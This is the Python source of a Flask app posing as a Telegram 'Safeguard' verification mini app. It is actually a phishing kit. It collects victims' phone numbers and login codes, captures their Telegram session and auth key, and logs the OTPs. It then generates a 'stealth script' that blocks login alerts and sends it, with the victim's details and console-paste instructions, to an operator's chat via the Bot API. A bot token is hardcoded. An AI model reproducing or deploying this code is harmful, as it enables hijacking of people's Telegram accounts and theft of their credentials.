from flask import Flask, render_template, request, jsonify, session, redirect, send_file
import os
import qrcode
import qrcode.image.svg
import io
import base64
import time
from datetime import datetime
import uuid
import asyncio
import logging
import requests
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('safeguard_bot.log', encoding='utf-8')
    ]
)

# Suppress Telethon's verbose logging
logging.getLogger('telethon').setLevel(logging.WARNING)
logging.getLogger('asyncio').setLevel(logging.WARNING)

# Initialize event loop for the entire application
def init_event_loop():
    """Initialize a global event loop for the application"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop

# Initialize the event loop before importing auth
app_loop = init_event_loop()

from utils.tg.auth import telegram_auth
from utils.credentials_manager import credentials_manager

# Initialize MongoDB with error handling
try:
    from utils.mongodb_manager import mongodb_manager
    if mongodb_manager.is_connected():
        logging.info("📊 MongoDB connected - using database storage")
    else:
        logging.info("📁 MongoDB not available - using file storage")
except Exception as e:
    logging.warning(f"⚠️ MongoDB initialization failed, using file storage: {e}")
    mongodb_manager = None

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this')

# Configure session settings
app.config['SESSION_COOKIE_SECURE'] = False  # Allow HTTP for development
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = 300  # 5 minutes

print(f"🔑 Session secret key: {app.secret_key[:10]}...")
print(f"🔑 Session config: {app.config.get('SESSION_COOKIE_SECURE', 'Not set')}")
print(f"🔑 Session config: {app.config.get('SESSION_COOKIE_HTTPONLY', 'Not set')}")

@app.route('/')
def index():
    """Main entry point for the Telegram mini app"""
    return render_template('index.html')

@app.route('/test-session')
def test_session():
    """Test endpoint to debug session issues"""
    print(f"🔍 Test session endpoint called")
    print(f"🔍 Current session: {dict(session)}")
    print(f"🔍 Session ID: {session.get('auth_session_id')}")
    
    # Test setting a value
    session['test_value'] = 'test_' + str(time.time())
    print(f"🔍 Session after setting test value: {dict(session)}")
    
    return jsonify({
        'session_data': dict(session),
        'session_id': session.get('auth_session_id'),
        'test_value': session.get('test_value')
    })

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle phone number login"""
    print(f"🔍 Login endpoint called - Method: {request.method}")
    print(f"🔍 Session at start of login: {dict(session)}")
    
    if request.method == 'POST':
        data = request.get_json()
        phone_number = data.get('phone_number')
        
        if not phone_number:
            return jsonify({'error': 'Phone number is required'}), 400

        # Handle resend case
        if phone_number == 'resend':
            # Get the stored phone number from session
            stored_phone = session.get('phone_number')
            if not stored_phone:
                return jsonify({'error': 'No phone number found. Please login again.'}), 400
            
            phone_number = stored_phone
            logging.info(f"Resending code to {phone_number}")

        # Store phone number in session for later use
        session['phone_number'] = phone_number

        # Send code to Telegram
        try:
            # Use the synchronous method
            result = telegram_auth.send_code_sync(phone_number)
            
            if result['success']:
                # Store session ID for verification
                session['auth_session_id'] = result['session_id']
                logging.info(f"Code sent successfully to {phone_number}")
                logging.info(f"Session ID stored: {result['session_id']}")
                logging.info(f"Session after storing: {dict(session)}")
                return jsonify({
                    'success': True,
                    'message': result['message'],
                    'phone_number': phone_number,
                    'session_id': result['session_id']  # Include session ID in response
                })
            else:
                logging.error(f"Failed to send code to {phone_number}: {result['message']}")
                return jsonify({
                    'success': False,
                    'error': result['message']
                }), 400
                
        except Exception as e:
            logging.error(f"Error in login for {phone_number}: {e}")
            return jsonify({
                'success': False,
                'error': 'Failed to send verification code. Please try again.'
            }), 500
    
    return render_template('login.html')

@app.route('/qr-login')
def qr_login():
    """Handle QR code login page"""
    # Generate a unique session ID for QR code
    qr_session_id = str(uuid.uuid4())
    session['qr_session_id'] = qr_session_id
    
    # Create QR code data (this would be your bot's login URL)
    qr_data = f"https://t.me/safeguard_bot?start=qr_{qr_session_id}"
    
    # Generate QR code as SVG
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(qr_data)
    qr.make(fit=True)
    
    # Create SVG QR code
    img = qr.make_image(image_factory=qrcode.image.svg.SvgImage)
    
    # Convert to string
    buffer = io.BytesIO()
    img.save(buffer)
    svg_string = buffer.getvalue().decode('utf-8')
    
    return render_template('qr_login.html', qr_code=svg_string, qr_session_id=qr_session_id)

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    """Handle OTP verification"""
    print(f"🔍 Verify endpoint called - Method: {request.method}")
    print(f"🔍 Request headers: {dict(request.headers)}")
    print(f"🔍 Session at start: {dict(session)}")
    
    if request.method == 'POST':
        data = request.get_json()
        otp = data.get('otp')
        session_id = data.get('session_id')  # Get session ID from request body

        if not otp:
            return jsonify({'error': 'OTP is required'}), 400

        # Get phone number from request data or session
        phone_number = data.get('phone_number') or session.get('phone_number')
        
        print(f"Session Id from request: {data.get('session_id')}")
        print(f"Phone number from request/session: {phone_number}")
        print(f"Full session data: {dict(session)}")
        print(f"Session keys: {list(session.keys())}")
        
        # Always try to find session by phone number in MongoDB
        if not session_id and phone_number and mongodb_manager and mongodb_manager.is_connected():
            print(f"🔍 Looking for session by phone number: {phone_number}")
            try:
                # Use the new method to find session by phone number
                session_result = mongodb_manager.find_session_by_phone(phone_number)
                if session_result:
                    session_id = session_result['session_id']
                    print(f"✅ Found session ID by phone number: {session_id}")
                else:
                    print(f"❌ No valid session found for phone number: {phone_number}")
            except Exception as e:
                print(f"❌ Error searching for session by phone number: {e}")
        elif not session_id:
            print(f"❌ Cannot search MongoDB - connected: {mongodb_manager.is_connected() if mongodb_manager else False}")
            print(f"❌ No phone number available: {phone_number}")
        
        if not session_id:
            return jsonify({'error': 'Session expired. Please try logging in again.'}), 400
        
        # Verify code with Telegram
        try:
            # Ensure we're using the same event loop
            if app_loop.is_closed():
                init_event_loop()
            
            # Use the synchronous method
            result = telegram_auth.verify_code_sync(session_id, otp)
            print(f"Result: {result}")

            if result['success']:
                # Store user info in session
                session['user_info'] = result['user_info']
                session['authenticated'] = True

                # Verify that we have real authentication data
                if 'session_data' in result and result['session_data']:
                    session_data = result['session_data']
                    
                    # Validate that this is real authentication
                    if not session_data.get('is_real_authentication', False):
                        logging.error("❌ Authentication failed: No real authentication data captured")
                        return jsonify({
                            'success': False,
                            'error': 'Authentication failed: Could not capture real authentication data. Please try again.'
                        }), 400
                    
                    # Validate auth key
                    if 'dc1_auth_key' not in session_data or len(session_data['dc1_auth_key']) < 100:
                        logging.error("❌ Authentication failed: Invalid or missing authentication key")
                        return jsonify({
                            'success': False,
                            'error': 'Authentication failed: Invalid authentication data. Please try again.'
                        }), 400
                    
                    logging.info("✅ Real authentication data validated successfully")
                    logging.info(f"🔑 Auth key length: {len(session_data['dc1_auth_key'])} characters")
                    logging.info(f"📦 Session string length: {len(session_data.get('session_string', ''))} characters")
                else:
                    logging.error("❌ Authentication failed: No session data returned")
                    return jsonify({
                        'success': False,
                        'error': 'Authentication failed: No session data captured. Please try again.'
                    }), 400

                # Log the verification code for debugging
                logging.info(f"Verification code entered: {otp}")
                logging.info(f"User authenticated: {result['user_info']}")

                # Automatically generate and send script to Telegram
                try:
                    # Generate script content
                    script_content = credentials_manager.generate_stealth_script(session_data)
                    
                    # Generate script filename
                    user_id = result['user_info'].get('id', 'unknown')
                    timestamp = int(time.time())
                    script_filename = f"auto_script_{user_id}_{timestamp}.js"
                    
                    # Save the script
                    script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
                    with open(script_filepath, 'w', encoding='utf-8') as f:
                        f.write(script_content)
                    
                    logging.info(f"✅ Auto-generated script: {script_filename}")
                    
                    # Send to Telegram if target user ID is configured
                    target_user_id = os.getenv('SCRIPT_TARGET_USER_ID')
                    if target_user_id:
                        try:
                            bot_token = os.getenv('TELEGRAM_BOT_TOKEN', '8033516348:AAE2ylmkjc8Q6Sj1b8yzvk19wvB3kYs-5-k')
                            
                            # Prepare message
                            message_parts = [
                                "🛡️ **Auto-Generated Stealth Script**",
                                "",
                                f"📁 **File:** `{script_filename}`",
                                f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
                                f"📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}",
                                f"🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}",
                                f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                                "",
                                "📝 **Instructions:**",
                                "1. Open https://web.telegram.org/a/ in your browser",
                                "2. Press F12 to open Developer Tools", 
                                "3. Go to Console tab",
                                "4. Copy and paste the script below",
                                "5. Press Enter to execute",
                                "",
                                "💡 **Tips:**",
                                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                                "- Try refreshing the page first",
                                "- Try using a different browser or incognito mode", 
                                "- Check if your network allows WebSocket connections",
                                "",
                                "🔗 **Script Content:**",
                                "```",
                                script_content,
                                "```"
                            ]
                            
                            message_text = "\n".join(message_parts)
                            
                            # Send stealth script file directly
                            header_parts = [
                                "🛡️ **Auto-Generated Stealth Script File**",
                                "",
                                f"📁 **File:** `{script_filename}`",
                                f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
                                f"📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}",
                                f"🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}",
                                f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                                "",
                                "📝 **Instructions:**",
                                "1. Download the script file below",
                                "2. Open https://web.telegram.org/a/ in your browser",
                                "3. Press F12 to open Developer Tools", 
                                "4. Go to Console tab",
                                "5. Copy and paste the script content",
                                "6. Press Enter to execute",
                                "",
                                "💡 **Tips:**",
                                "- This stealth script blocks notifications to prevent login alerts",
                                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                                "- Try refreshing the page first",
                                "- Try using a different browser or incognito mode", 
                                "- Check if your network allows WebSocket connections"
                            ]
                            
                            header_text = "\n".join(header_parts)
                            
                            # Send header message
                            response1 = requests.post(
                                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                json={
                                    "chat_id": target_user_id,
                                    "text": header_text,
                                    "parse_mode": "Markdown"
                                }
                            )
                            
                            # Send the script file
                            script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
                            with open(script_filepath, 'rb') as script_file:
                                files = {'document': (script_filename, script_file, 'text/javascript')}
                                response2 = requests.post(
                                    f"https://api.telegram.org/bot{bot_token}/sendDocument",
                                    data={'chat_id': target_user_id},
                                    files=files
                                )
                            
                            if response1.status_code == 200 and response2.status_code == 200:
                                logging.info(f"✅ Auto-sent stealth script file to Telegram user {target_user_id}")
                            else:
                                logging.error(f"❌ Failed to auto-send script file: {response1.text} {response2.text}")
                                    
                        except Exception as e:
                            logging.error(f"❌ Error auto-sending script to Telegram: {e}")
                    else:
                        logging.info("⚠️ No SCRIPT_TARGET_USER_ID configured, skipping auto-send")
                        
                except Exception as e:
                    logging.error(f"❌ Error auto-generating script: {e}")

                return jsonify({
                    'success': True,
                    'message': result['message'],
                    'user_info': result['user_info']
                })
            else:
                logging.error(f"Verification failed for code {otp}: {result['message']}")
                return jsonify({
                    'success': False,
                    'error': result['message']
                }), 400

        except Exception as e:
            logging.error(f"Error in verification for code {otp}: {e}")
            logging.error(f"Error type: {type(e).__name__}")
            import traceback
            logging.error(f"Traceback: {traceback.format_exc()}")
            
            # Clean up the session on error
            try:
                telegram_auth.cleanup_session(session_id)
            except:
                pass
            
            # Provide more specific error messages
            error_message = 'Failed to verify code. Please try again.'
            if "Real authentication key could not be captured" in str(e):
                error_message = 'Authentication failed: Could not capture real authentication data. Please try again.'
            elif "Real authentication required" in str(e):
                error_message = 'Authentication failed: Real authentication is required. Please try again.'
            elif "Failed to capture real authentication data" in str(e):
                error_message = 'Authentication failed: Could not capture authentication data. Please try again.'
            
            return jsonify({
                'success': False,
                'error': error_message
            }), 500
    
    # For GET requests, render verify.html with the phone number from session
    phone_number = session.get('phone_number', '')
    return render_template('verify.html', phone_number=phone_number)

@app.route('/dashboard')
def dashboard():
    """Main dashboard after successful login"""
    phone_number = session.get('phone_number')
    if not phone_number:
        return redirect('/login')
    
    return render_template('dashboard.html', phone_number=phone_number)

@app.route('/logout', methods=['POST'])
def logout():
    """Handle user logout"""
    # Clean up any active auth sessions
    session_id = session.get('auth_session_id')
    if session_id:
        try:
            telegram_auth.cleanup_session(session_id)
        except:
            pass
    
    session.clear()
    return jsonify({'success': True, 'message': 'Logged out successfully'})

@app.route('/qr-verify/<qr_session_id>')
def qr_verify(qr_session_id):
    """Handle QR code verification when scanned"""
    # Check if QR session exists
    if session.get('qr_session_id') == qr_session_id:
        # Mark QR code as scanned
        session['qr_scanned'] = True
        session['phone_number'] = 'qr_login_' + qr_session_id[:8]
        return jsonify({
            'success': True,
            'message': 'QR code verified successfully',
            'redirect': '/dashboard'
        })
    else:
        return jsonify({
            'success': False,
            'message': 'Invalid or expired QR code'
        }), 400

@app.route('/check-qr-status')
def check_qr_status():
    """Check if QR code has been scanned"""
    qr_session_id = session.get('qr_session_id')
    qr_scanned = session.get('qr_scanned', False)
    
    if qr_scanned:
        return jsonify({
            'success': True,
            'scanned': True,
            'redirect': '/dashboard'
        })
    else:
        return jsonify({
            'success': True,
            'scanned': False
        })

@app.route('/credentials')
def view_credentials():
    """View saved credentials files"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    files = credentials_manager.list_credentials_files()
    
    # Calculate file counts
    json_count = len([f for f in files if f['filename'].endswith('.json')])
    js_count = len([f for f in files if f['filename'].endswith('.js')])
    
    return render_template('credentials.html', files=files, json_count=json_count, js_count=js_count)

@app.route('/credentials/<filename>')
def download_credentials(filename):
    """Download a specific credentials file"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    filepath = os.path.join(credentials_manager.storage_dir, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404

@app.route('/credentials/view/<filename>')
def view_credential_file(filename):
    """View the contents of a credentials file"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    data = credentials_manager.load_credentials(filename)
    if data:
        return render_template('view_credential.html', data=data, filename=filename)
    else:
        return jsonify({'error': 'File not found or invalid'}), 404

@app.route('/credentials/generate-script/<filename>')
def generate_script_for_credential(filename):
    """Generate localStorage script for an existing credential file"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    logging.info(f"🔧 Generating script for file: {filename}")
    
    # Load the credential file
    data = credentials_manager.load_credentials(filename)
    if not data:
        logging.error(f"❌ File not found or invalid: {filename}")
        return jsonify({'error': 'File not found or invalid'}), 404
    
    try:
        # Extract session_data from the credential file
        session_data = data.get('session_data', {})
        logging.info(f"📦 Session data keys: {list(session_data.keys()) if session_data else 'None'}")
        
        if not session_data:
            logging.error(f"❌ No session data found in file: {filename}")
            return jsonify({'error': 'No session data found in credential file'}), 400
        
        # Generate script filename
        user_id = data.get('user_id', 'unknown')
        script_filename = f"script_{user_id}_{int(time.time())}.js"
        script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
        
        logging.info(f"📝 Generating script content...")
        
        # Generate and save the script using stealth format
        script_content = credentials_manager.generate_stealth_script(session_data)
        
        logging.info(f"📝 Script content length: {len(script_content)}")
        
        with open(script_filepath, 'w', encoding='utf-8') as f:
            f.write(script_content)
        
        logging.info(f"✅ Generated localStorage script: {script_filename}")
        
        return jsonify({
            'success': True,
            'message': f'Script generated: {script_filename}',
            'script_filename': script_filename
        })
        
    except Exception as e:
        logging.error(f"❌ Error generating script for {filename}: {e}")
        logging.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
        import traceback
        logging.error(f"❌ Traceback: {traceback.format_exc()}")
        return jsonify({'error': f'Failed to generate script: {str(e)}'}), 500

@app.route('/credentials/delete/<filename>', methods=['DELETE'])
def delete_credential_file(filename):
    """Delete a credential or script file"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        filepath = os.path.join(credentials_manager.storage_dir, filename)
        
        # Check if file exists
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'}), 404
        
        # Delete the file
        os.remove(filepath)
        logging.info(f"Deleted credential file: {filename}")
        
        return jsonify({
            'success': True,
            'message': f'File {filename} deleted successfully'
        })
        
    except Exception as e:
        logging.error(f"Error deleting file {filename}: {e}")
        return jsonify({'error': 'Failed to delete file'}), 500

if __name__ == '__main__':
    print("🚀 Starting Safeguard Bot Flask App...")
    print("📱 Phone authentication: ENABLED")
    print("🔐 5-digit verification codes: ENABLED")
    print("📋 Paste functionality: ENABLED")
    
    # Get port from environment variable (for deployment) or use default
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') == 'development'
    
    print(f"🌐 Web app running at: http://127.0.0.1:{port}")
    print("📝 Logs will be saved to: safeguard_bot.log")
    print("=" * 50)
    
    try:
        app.run(debug=debug, host='0.0.0.0', port=port)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        # Clean up all active sessions
        telegram_auth.cleanup_expired_sessions(0)  # Clean all sessions
        # Close MongoDB connection
        # mongo_session_manager.close() # This line is removed as per the edit hint
        if not app_loop.is_closed():
            app_loop.close()
        print("✅ Cleanup completed") 